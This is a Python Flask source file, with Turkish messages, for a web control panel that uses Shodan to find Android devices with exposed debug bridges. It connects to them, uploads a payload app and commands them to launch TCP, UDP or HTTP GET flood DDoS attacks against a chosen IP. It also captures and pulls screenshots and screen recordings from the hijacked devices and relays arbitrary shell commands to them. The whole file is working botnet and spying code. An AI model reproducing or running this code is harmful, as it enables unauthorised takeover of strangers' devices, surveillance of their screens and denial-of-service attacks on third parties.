# coding=utf-8
#!/usr/bin/env python3

from flask import Flask, render_template, request, jsonify, url_for
from time import strftime, time, sleep
from os import path
from logging import getLogger, ERROR

from libs.libshodan import web
from libs.adb import current_adb_client, adb_client
from libs.helpers import success, error, info, is_ip

website_app = Flask(__name__, static_folder=path.abspath('./libs/templates/static'))
current_adb_client = adb_client("127.0.0.1")
run_ddos_attack = True

def get_ip(request):
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0]
    else:
        return request.remote_addr

@website_app.route("/", methods=["GET"])
def index():
    return render_template("index.html")
@website_app.route("/shodan/", methods=["GET"])
def _shodan():
    return render_template("shodan.html", api_key=web.api_key)
@website_app.route("/zombies/", methods=["GET"])
def zombies():
    return render_template("zombies.html", api_key=web.api_key, zombie_list=web.last_search, zombie_list_length=len(web.last_search["matches"]))
@website_app.route("/shodan_search/", methods=["GET"])
def shodan_search():
    return jsonify(web.search("android debug bridge"))
@website_app.route("/update/", methods=["POST"])
def update():
    json = request.get_json()
    if ("api-key" not in json): return "NOT OK"
    web.api_key = json["api-key"]
    success("Shodan API anahtarı güncellendi: " + web.api_key)
    return "OK"
@website_app.route("/shell/", methods=["GET", "POST"])
def shell():
    if (request.method == "POST"):
        if ("ip" in request.form):
            return render_template("shell.html", ip=request.form["ip"])
    
    return render_template("shell.html", ip="Girilmedi!")
@website_app.route("/ddos/", methods=["GET"])
def ddos():
    return render_template("ddos.html")
@website_app.route("/get_last_shodan_search/", methods=["GET"])
def get_last_shodan_search():
    return jsonify(web.last_search)
@website_app.route("/setup_machine/", methods=["POST"])
def setup_machine():
    if (run_ddos_attack == False):
        return "NOT OK"

    if ("ip" not in request.form):
        return "NOT OK"

    if ("target_ip" not in request.form):
        return "NOT OK"
    
    ip = request.form["ip"]
    target_ip = request.form["target_ip"]
    if ("port" not in request.form):
        return "NOT OK"

    port = request.form["port"]
    if ("packet_count" not in request.form):
        return "NOT OK"

    packet_count = request.form["packet_count"]
    if ("thread_count" not in request.form):
        return "NOT OK"

    thread_count = request.form["thread_count"]
    if ("method" not in request.form):
        return "NOT OK"
    
    method = request.form["method"]
    client = adb_client(ip)
    client.connect()
    client.upload_payload()
    if (not client.send(
        "am start -a android.intent.action.VIEW -c android.intent.category.DEFAULT -n com.example.tlp/.StartDDOS -e ip {0} -e method {1} -e packet_count {2} -e port {3} -e threads_count {4}".format(target_ip, method, packet_count, port, thread_count)
        )): return "NOT OK"
    success("{0} adresi zombileştirildi ve {1} adresine saldırı başladı!".format(ip, target_ip))
    return "OK"

@website_app.route("/stop_machine/", methods=["POST"])
def stop_machine():
    if ("ip" not in request.form):
        return "NOT OK"
    
    ip = request.form["ip"]

    client = adb_client(ip)
    client.connect()
    if (not client.send(
        "am start -a android.intent.action.VIEW -c android.intent.category.DEFAULT -n com.example.tlp/.StopDDOS"
    )): return "NOT OK"
    success("{0} adresi saldırmayı durdurdu!".format(ip))
    return "OK"

@website_app.route("/adb_connect/", methods=["POST"])
def adb_connect():
    if (request.method == "POST"):
        if ("ip" in request.form):
            client = adb_client(request.form["ip"])
            if (client.connect(auth_timeout=5) == False): return "NOT OK"
            global current_adb_client
            current_adb_client = client
            return "OK"
    return "NOT OK"

@website_app.route("/adb_send/", methods=["POST"])
def adb_send():
    if (request.method == "POST"):
        if (("ip" in request.form) and ("command" in request.form)):
            if (current_adb_client.ip != request.form["ip"]):
                error("Komut gönderilmeden önce {} adresine bağlanmalısınız!".format(request.form["ip"]))
                return "NOT OK"

            client = current_adb_client
            if (request.form["command"] == "deploy-payload"):
                _tmp = client.upload_payload()
                if (_tmp == False): return "NOT OK"
                return "[+] Payload yüklendi!"
            elif (request.form["command"].startswith("start-ddos")):
                if (len(request.form["command"].split(" ")) < 5):
                    return "[-] Parametreler girilmemiş!"

                method = request.form["command"].split(" ")[1]
                if ((method != "TCPFLOOD") and (method != "UDPFLOOD") and (method != "GETFLOOD")):
                    return "[-] Method parametresi TCPFLOOD, UDPFLOOD veya GETFLOOD olmalıdır!"

                packet_count = request.form["command"].split(" ")[2]
                if (packet_count.isdigit() == False and packet_count != "MAX"):
                    return "[-] Paket sayısı parametresi bir sayı olmalıdır!"

                thread_count = request.form["command"].split(" ")[3]
                if ((thread_count.isdigit()) == False):
                    return "[-] Thread sayısı parametresi bir sayı olmalıdır!"
                
                ip = request.form["command"].split(" ")[4]
                if ((is_ip(ip)) == False):
                    return "[-] IP parametresi doğru bir IPV4 adresi olmalıdır!"
                
                port = request.form["command"].split(" ")[5]
                if ((port.isdigit()) == False):
                    return "[-] Port parametresi bir sayı olmalıdır!"
                
                _tmp = client.send("am start -a android.intent.action.VIEW -c android.intent.category.DEFAULT -n com.example.tlp/.StartDDOS -e ip {0} -e method {1} -e packet_count {2} -e port {3} -e threads_count {4}".format(ip, method, packet_count, port, thread_count))
                if (_tmp == False): return "NOT OK"
                return "[+] DDoS Saldırısı başladı! Durdurmak için 'stop-ddos' komutunu kullanınız!"
            elif (request.form["command"] == "stop-ddos"):
                _tmp = client.send("am start -a android.intent.action.VIEW -c android.intent.category.DEFAULT -n com.example.tlp/.StopDDOS")
                if (_tmp == False): return "NOT OK"
                return "[+] Bütün DDoS Saldırıları durduruldu!"
            elif (request.form["command"] == "screenshot"):
                timestamp = str(int(time()))
                _tmp = client.send("screencap /sdcard/ss_{}.png".format(timestamp))
                success("[{}] Ekran kayıdı alındı! Bilgisayara yükleniyor...".format(request.form["ip"]))
                _tmp = client.pull("/sdcard/ss_{}.png".format(timestamp), "ss_{}.png".format(timestamp), timeout=60)
                if (_tmp == False): return "[+] Screenshot tamamen alınamadı! ./libs./templates/pulls/ss_{0}.png dosyasına kayıt edildi! Ulaşmak için http://127.0.0.1:5000/static/pulls/ss_{1}.png".format(timestamp, timestamp)
                return "[+] Screenshot ./libs./templates/pulls/ss_{0}.png dosyasına kayıt edildi! Ulaşmak için http://127.0.0.1:5000/static/pulls/ss_{1}.png".format(timestamp, timestamp)
            elif (request.form["command"].startswith("screenvideo")):
                if (len(request.form["command"].split(" ")) < 2):
                    return "[-] Saniye parametresi girilmemiş!"

                seconds = request.form["command"].split(" ")[1]
                if ((seconds.isdigit()) == False):
                    return "[-] Saniye parametresi bir sayı olmalıdır!"
                if (int(seconds) > 180):
                    return "[-] Saniye parametresi maksimum 180 saniye olmaldır!"
                
                timestamp = str(int(time()))
                _tmp = client.send("screenrecord --time-limit {0} /sdcard/vid_{1}.mp4".format(seconds, timestamp), timeout=(int(seconds) + 5))
                sleep(3)
                _tmp = client.pull("/sdcard/vid_{}.mp4".format(timestamp), "vid_{}.mp4".format(timestamp))
                if (not _tmp): return "NOT OK"
                return "[+] Screenrecord ./libs./templates/pulls/vid_{0}.mp4 dosyasına kayıt edildi! Ulaşmak için http://127.0.0.1:5000/static/pulls/vid_{1}.mp4".format(timestamp, timestamp)
                
            tmp = client.send(request.form["command"])
            print(tmp)
            if (not tmp): return "NOT OK"
            return tmp
    
    return "NOT OK"